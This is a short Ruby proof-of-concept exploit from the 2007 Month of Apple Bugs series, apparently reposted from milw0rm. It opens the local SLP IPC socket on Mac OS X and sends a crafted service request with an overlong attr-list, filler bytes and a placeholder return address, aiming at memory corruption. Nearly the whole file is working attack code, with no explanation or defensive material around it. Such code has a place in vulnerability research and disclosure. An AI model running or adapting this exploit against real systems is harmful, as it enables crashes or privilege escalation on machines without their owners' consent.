#!/usr/bin/ruby
# (c) Copyright 2006 Lance M. Havok	  <lmh [at] info-pull.com>
#    			           Kevin Finisterre <kf_lists [at] digitalmunition.com>
# All pwnage reserved.
#
# Proof of concept for MOAB-17-01-2007
# http://projects.info-pull.com/moab/MOAB-17-01-2007.html
#
# Originally reported to Apple by Kevin, on 08/02/2006.

require 'socket'

target_path = (ARGV[0] || '/var/run/slp_ipc')
slp_socket	= UNIXSocket.open(target_path)

payload =   ("\x58" * 506)
payload <<  [0xdeadbeef].pack("V")            # ...it expects a valid mem. address (ex. 0xbffff398)

stream  = "\x01"                            + # SrvRqst = 1
          "\x00\x13"                        + # Length of remaining fields? (up to attr-list)
          "\x04\x00\x00\x00\x00\x00\x00"    +
          "\x00\x02\x00\x00"                + # length of scope-list string
          "\x78\x78"                        + # <scope-list>
          "\xff\x03\x00\x00"                + # length of attr-list string 0x3ff = 1023 in hex.
          (payload)                           # <attr-list>

slp_socket.write stream
slp_socket.close

# milw0rm.com [2007-01-18]